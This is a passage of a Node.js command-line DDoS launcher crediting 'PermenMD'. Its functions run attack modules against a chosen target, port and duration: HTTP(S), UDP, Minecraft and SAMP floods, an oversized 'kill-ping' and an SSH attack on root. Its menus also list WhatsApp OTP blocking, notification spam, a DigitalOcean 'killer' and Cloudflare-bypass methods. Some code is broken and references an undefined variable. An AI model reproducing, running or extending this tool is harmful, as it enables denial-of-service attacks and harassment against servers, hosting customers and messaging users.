const flood = path.join(__dirname, `/lib/methode/flood`);
const ssh = path.join(__dirname, `/lib/AttackSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function udp_flood(args) {
if (args.length < 3) {
console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
sigma();
return
}
const [target, port, duration] = args
try {
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     UDP Raw Flood Attack Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: UDP Raw
┃ ⌬ Creator: PermenMD
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function mcbot(args) {
if (args.length < 3) {
console.log(`Example: .mc-flood <target> <port> <duration>
mc-flood 123.456.78.910 25565 300`);
sigma();
return
}
const [target, port, duration] = args
try {
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     Minecraft Flood Attack Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: Minecraft Flooder
┃ ⌬ Creator: PermenMD
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
sigma()
}

const metode = path.join(__dirname, `/lib/AttackMc`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function samp(args) {
if (args.length < 3) {
console.log(`Example: .samp <target> <port> <duration>
samp 123.456.78.910 7777 300`);
sigma();
return
}
const [target, port, duration] = args
try {
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     SAMP Flood Attack Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: SAMP Flooder
┃ ⌬ ISP: ${result.isp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
sigma()
}
const metode = path.join(__dirname, `/lib/AttackSamp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function pod(args) {
if (args.length < 3) {
console.log(`Example: .kill-ping <target> <duration>
kill-ping 123.456.78.910 300`);
sigma();
return
}
const [target, duration] = args
try {
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃     Ping Kill Attack Launched
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Target : ${target}
┃ ⌬ Duration : ${duration}
┃ ⌬ Methods: kill-ping
┃ ⌬ ISP: ${result.isp}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
sigma()
}
const metode = path.join(__dirname, `/lib/ping`);
exec(`node ${metode} ${target} 65500 10 10 ${duration}`)
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function subdomen(args) {
if (args.length < 1) {
console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
sigma();
return
}
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃          Subdomains Finder
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Subdomainya : ${hasilmanuk}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
} catch (error) {
console.log(`Oops Something Went Wrong`)
sigma()
}
sigma()
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function sigma() {
const creatorCredits = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃             Thanks For
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ AroganzzTeam ( Marga Gw )
┃ ⌬ XPanzZyyOfficial ( Developer )
┃ ⌬ Primrose Lotus ( Nanti )
┃ ⌬ Para Buyyer Gw
┃ ⌬ Para Penyedia Api
┃ ⌬ Dan Kalian Semua
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
permen.question(themeQuestion, (input) => {
const [command, ...args] = input.trim().split(/\s+/);

if (command === 'help') {
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃             Helper Tools
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Methods show list of available methods
┃ ⌬ Track-ip track ip address with info
┃ ⌬ Subdo-finder find all subdomain from domain
┃ ⌬ Kill-wifi kill your wifi (termux/linux/windows only)
┃ ⌬ Kill-ssh kill VPS Access
┃ ⌬ Kill-otp kill WhatsApp OTP Verification
┃ ⌬ Flood-notif Spam WhatsApp Pairing Notification
┃ ⌬ Kill-ping sending death pinger
┃ ⌬ Samp S.A.M.P Flooder
┃ ⌬ Mc-flood Minecraft Bot Flooder
┃ ⌬ Attack launch ddos attack jkwwkwjjw
┃ ⌬ Udp-raw launch udp flood attack
┃ ⌬ Kill-do digital ocean killer
┃ ⌬ Ongoing show ongoing attack
┃ ⌬ News show latest permenmd news
┃ ⌬ Ai Chat With Ai
┃ ⌬ Theme Change Theme
┃ ⌬ Credits show creator of these tools
┃ ⌬ Clear clear terminal
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
sigma();
} else if (command === 'methods') {
console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃             L7 Methods
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ Flood HTTP(s) Flood DdoS
┃ ⌬ Tls TLS 1.3 
┃ ⌬ Strike Best DDoS methods
┃ ⌬ Lill Bypass Cf DDoS methods
┃ ⌬ Raw Huge RPS Flexing XD
┃ ⌬ Bypass Bypass With High Power
┃ ⌬ Thunder Massive Power Methods
┃ ⌬ Storm The Raining Request
┃ ⌬ Rape Bypass Protection
┃ ⌬ Destroy Kill That Socket
┃ ⌬ Slim Oh Is Fit There
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃             L4 Methods
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ H2
┃ ⌬ Mix
┃ ⌬ RawMix
┃ ⌬ OvhUdp
┃ ⌬ Tcp
┃ ⌬ TcpPps
┃ ⌬ Udp
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━
`);
sigma();
} else if (command === 'credits') {
console.log(`
${creatorCredits}`);
sigma();
} else if (command === 'attack') {
handleAttackCommand(args);
} else if (command === 'kill-ssh') {
killSSH(args);
} else if (command === 'kill-otp') {
killOTP(args);
} else if (command === 'udp-raw') {
udp_flood(args);
} else if (command === 'kill-do') {
killDo(args);
} else if (command === 'ongoing') {
ongoingAttack()
sigma()
} else if (command === 'track-ip') {
trackIP(args);
} else if (command === 'mc-flood') {
mcbot(args)
} else if (command === 'kill-ping') {
pod(args)
} else if (command === 'theme') {
chTheme()
} else if (command === 'flood-notif') {
flNotif()
} else if (command === 'samp') {
samp(args)
} else if (command === 'subdo-finder') {
subdomen(args)
} else if (command === 'kill-wifi') {
killWifi()
} else if (command === 'clear') {
banner(theme)
sigma()
} else {
console.log(`${command} Not Found`);
sigma();
}
});
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

function clearall() {
clearProxy()
clearUserAgent()
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

process.on('exit', clearall);
process.on('SIGINT', () => {
clearall()
process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()